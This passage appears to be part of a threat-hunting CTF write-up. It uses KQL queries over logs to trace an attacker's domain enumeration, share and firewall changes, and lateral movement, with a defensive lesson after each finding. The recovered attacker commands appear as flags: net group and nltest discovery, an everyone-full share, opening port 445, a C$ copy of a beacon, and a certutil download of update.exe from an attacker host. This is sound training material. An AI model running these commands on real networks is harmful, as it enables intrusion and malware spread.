@@ -850,3 +850,209 @@ On the workstation at 10:43:17 PM, `net user /domain` executed — querying the 
 
 </details>
 
+<details>
+<summary>Q25 — Privilege Enumeration</summary>
+
+**Goal:** Identify the command used to enumerate Domain Admin group membership.
+
+**Approach:** Immediately after net user /domain, the attacker would target the highest-privilege group. Searched for net group commands in the same narrow time window.
+
+```kql
+EmberForgeX_CL
+| where TimeGenerated >= datetime(2026-02-10T22:43:17)
+| where TimeGenerated <= datetime(2026-02-10T22:44:00)
+| where CommandLine_s has "net" and CommandLine_s has "group"
+| project TimeGenerated, Computer, CommandLine_s
+| order by TimeGenerated asc
+```
+
+<img width="676" height="161" alt="image" src="https://github.com/user-attachments/assets/edf2f7f0-bf63-4ea7-9efa-b2fd7c438aa2" />
+<br>
+
+Seconds after the user enumeration, `net group "Domain Admins" /domain` ran on the workstation — pulling the membership list of the highest-privilege group in the domain.
+
+**Flag:** `net group "Domain Admins" /domain`
+
+> **Lesson:** net user /domain and net group "Domain Admins" /domain almost always appear together in the same discovery sequence. The attacker knows who exists, then narrows to who has the most access. This two-command pattern is a high-confidence indicator of an attacker mapping the domain for lateral movement targets and credential reuse opportunities.
+
+</details>
+
+<details>
+<summary>Q26 — Infrastructure Mapping</summary>
+
+**Goal:** Identify the command used to locate the Domain Controller.
+
+**Approach:** After enumerating users and admins, the attacker needed to find the DC's hostname and IP. Multiple queries failed first — initial searches for nltest, dsquery, and nslookup in the same time window returned Edge update noise instead. Broadening to all commands on the workstation in the post-enumeration window also didn't surface it directly due to result volume.
+
+Eventually searched for nltest specifically across the full hunt window:
+
+```kql
+EmberForgeX_CL
+| where TimeGenerated >= datetime(2026-02-10)
+| where TimeGenerated <= datetime(2026-02-11)
+| where CommandLine_s has "nltest"
+| project TimeGenerated, Computer, CommandLine_s
+```
+
+<img width="607" height="159" alt="image" src="https://github.com/user-attachments/assets/06568439-a0df-47a1-bae1-69556a848707" />
+<br>
+
+**Failed Submissions:**
+- Submitted `ipconfig /all` — Rejected. Visible in results but not the correct answer for DC location.
+
+`nltest /dclist:emberforge.local` surfaced on the workstation, listing all Domain Controllers in the domain. This is how the attacker confirmed the DC hostname and IP before pivoting.
+
+**Flag:** `nltest /dclist:emberforge.local`
+
+> **Lesson:** nltest is a native Windows tool originally built for domain trust diagnostics. Attackers use it because it's already present on every Windows machine and doesn't require any download. /dclist returns every DC in the target domain — hostname, IP, and site. When hunting discovery activity, nltest is often missed in favor of more obvious commands like net. It belongs in every detection ruleset for post-exploitation enumeration.
+
+</details>
+
+## ↔️ Phase 7: How did they spread?
+
+<details>
+<summary>Q27 — Tool Staging Share</summary>
+
+**Goal:** Identify the network share created to stage tools for lateral movement.
+
+**Approach:** With SYSTEM-level access established via spoolsv.exe injection, the attacker needed to distribute tools across the network. Searched for net share commands — a common way to expose a local directory to other hosts.
+
+```kql
+EmberForgeX_CL
+| where TimeGenerated >= datetime(2026-02-10)
+| where TimeGenerated <= datetime(2026-02-11)
+| where CommandLine_s has "net share"
+| project TimeGenerated, Computer, CommandLine_s
+| order by TimeGenerated asc
+```
+
+<img width="799" height="232" alt="image" src="https://github.com/user-attachments/assets/908de30a-81a2-4ee6-a5ca-a19828bce785" />
+<br>
+
+On the workstation at 10:39:33 PM:
+
+```
+cmd.exe /c "net share tools=C:\Users\Public /grant:everyone,full"
+```
+
+A share named "tools" was created pointing to C:\Users\Public with full access granted to everyone — an open distribution point for any host on the network to pull tools from.
+
+**Flag:** `net share tools=C:\Users\Public /grant:everyone,full`
+
+> **Lesson:** Creating a world-accessible share from C:\Users\Public is a classic lateral movement preparation step. It requires no special permissions to set up once SYSTEM access is achieved, and it gives the attacker a pull mechanism — other compromised hosts can reach back to the workstation and grab tools without needing another push. The /grant:everyone,full flag is the telltale sign of malicious intent — no legitimate admin creates a share with those permissions.
+
+</details>
+
+<details>
+<summary>Q28 — Firewall Manipulation</summary>
+
+**Goal:** Identify the protocol the attacker opened a firewall rule for to enable lateral movement.
+
+**Approach:** To move laterally via SMB admin shares, the attacker needed to ensure the firewall wouldn't block the connection. Searched for firewall rule creation commands.
+
+```kql
+EmberForgeX_CL
+| where TimeGenerated >= datetime(2026-02-10)
+| where TimeGenerated <= datetime(2026-02-11)
+| where CommandLine_s has "firewall"
+| project TimeGenerated, Computer, CommandLine_s
+| order by TimeGenerated asc
+```
+
+<img width="1067" height="217" alt="image" src="https://github.com/user-attachments/assets/7cd537d3-64a2-4538-a6dc-b20b1b3bd2eb" />
+<br>
+
+The command returned:
+
+```
+netsh advfirewall firewall add rule name="SMB" dir=in action=allow protocol=tcp localport=445
+```
+
+Port 445 is SMB — the protocol used for admin share access (C$). The rule name makes the intent explicit.
+
+**Flag:** `SMB`
+
+> **Lesson:** netsh firewall rule creation is a high-confidence lateral movement indicator when the rule targets port 445. Defenders with host-based firewall logging enabled will see this as an EventID 4946 (firewall rule added). The combination of a net share command and a firewall rule opening SMB in the same time window is a strong lateral movement preparation signature — both actions together indicate the attacker is building the infrastructure to move to the next host.
+
+</details>
+
+<details>
+<summary>Q29 — Post-Escalation Parent</summary>
+
+**Goal:** Identify the SYSTEM-level process that was the parent of the lateral movement commands.
+
+**Approach:** The net share and firewall commands ran under a SYSTEM context — meaning they were spawned from the injected beacon, not from lmartin's session. Pivoted to the parent process field on the net share command to confirm which process the beacon was living in.
+
+```kql
+EmberForgeX_CL
+| where TimeGenerated >= datetime(2026-02-10)
+| where TimeGenerated <= datetime(2026-02-11)
+| where CommandLine_s has "net share tools"
+| project TimeGenerated, Computer, Image_s, ParentImage_s, ParentCommandLine_s
+```
+
+<img width="1097" height="226" alt="image" src="https://github.com/user-attachments/assets/f03f8c29-209a-4ef7-b28c-8ef6a3a3917d" />
+<br>
+
+ParentImage_s returned `C:\Windows\System32\spoolsv.exe` — the same Print Spooler process that update.exe injected into back in Q21. The SYSTEM beacon was running all lateral movement commands from within spoolsv.
+
+**Flag:** `spoolsv.exe`
+
+> **Lesson:** Checking the parent process on discovery and lateral movement commands tells you which security context the attacker is operating from. spoolsv.exe running shell commands is anomalous — the Print Spooler has no legitimate reason to spawn cmd.exe or net.exe. This parent-child relationship is itself a high-fidelity detection: any process spawning from spoolsv.exe that isn't a print-related binary should trigger an alert.
+
+</details>
+
+<details>
+<summary>Q30 — Beacon Distribution</summary>
+
+**Goal:** Identify the command used to copy the beacon to the server.
+
+**Approach:** With the staging share and firewall rule in place, the attacker pushed update.exe to the server via the admin share. Searched for copy commands targeting the C$ admin share.
+
+```kql
+EmberForgeX_CL
+| where TimeGenerated >= datetime(2026-02-10)
+| where TimeGenerated <= datetime(2026-02-11)
+| where CommandLine_s has "C$"
+| project TimeGenerated, Computer, CommandLine_s
+| order by TimeGenerated asc
+```
+
+<img width="886" height="113" alt="image" src="https://github.com/user-attachments/assets/3c1f0cd3-01b4-4f27-b89a-5764f5e1583b" />
+<br>
+
+On the workstation at 10:41:22 PM:
+
+```
+cmd.exe /c copy C:\Users\Public\update.exe \\10.1.57.66\C$\Users\Public\update.exe
+```
+
+The attacker copied the beacon binary directly to the server's C$ admin share, staging it in the same world-writable Public directory.
+
+**Flag:** `cmd.exe /c copy C:\Users\Public\update.exe \\10.1.57.66\C$\Users\Public\update.exe`
+
+> **Lesson:** The C$ admin share is the simplest lateral movement path available to a SYSTEM-level process. No service installation needed — just a direct file copy. Monitoring for copy commands targeting \\hostname\C$ or \\IP\C$ paths is a reliable lateral movement detection. The destination directory (C:\Users\Public\) matches the staging pattern used on the original workstation, which is another consistency indicator that threat hunters can use to attribute activity across hosts.
+
+</details>
+
+<details>
+<summary>Q31 — LOLBin Tool Staging</summary>
+
+**Goal:** Identify the LOLBin used on the server to download the beacon from the attacker's staging infrastructure.
+
+**Approach:** No additional query needed. The Q30 results already captured this. While looking at C$ copy commands, the server's certutil download command was visible in the same result set — running 11 seconds before the workstation's copy command.
+
+From the Q30 query results, on the server at 10:41:11 PM:
+
+```
+certutil -urlcache -f http://sync.cloud-endpoint.net:8080/update.exe C:\Users\Public\update.exe
+```
+
+certutil pulled update.exe directly from the attacker's staging server before the workstation copy even ran — indicating the server may have been compromised via a separate path, or the attacker ran both methods in parallel.
+
+**Flag:** `certutil.exe > http://sync.cloud-endpoint.net:8080/update.exe`
+
+> **Lesson:** Attackers often use multiple delivery methods simultaneously — push via admin share and pull via LOLBin download. certutil -urlcache is one of the most widely abused download cradles because it's present on every Windows system and was originally designed for certificate handling. The -urlcache flag caches the downloaded content locally, making it retrievable even after the original download. When hunting tool staging, always check both push (copy to C$) and pull (certutil, bitsadmin, PowerShell IWR) mechanisms — they often appear together.
+
+</details>
+
